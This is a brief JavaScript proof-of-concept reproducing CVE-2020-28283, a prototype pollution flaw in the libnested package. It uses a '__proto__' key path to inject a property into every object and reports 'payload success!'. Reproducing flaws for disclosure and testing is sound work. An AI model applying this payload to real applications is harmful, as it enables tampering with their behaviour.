//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28283

var libnested = require("libnested")
const { assert } = require("@firebase/util");

var obj = {}
console.log("Before : " + obj.polluted);
libnested.set(obj, ['__proto__', 'polluted'], "yes");

console.log("After : " + obj.polluted);
assert({}.polluted === "yes");
console.log("payload success!");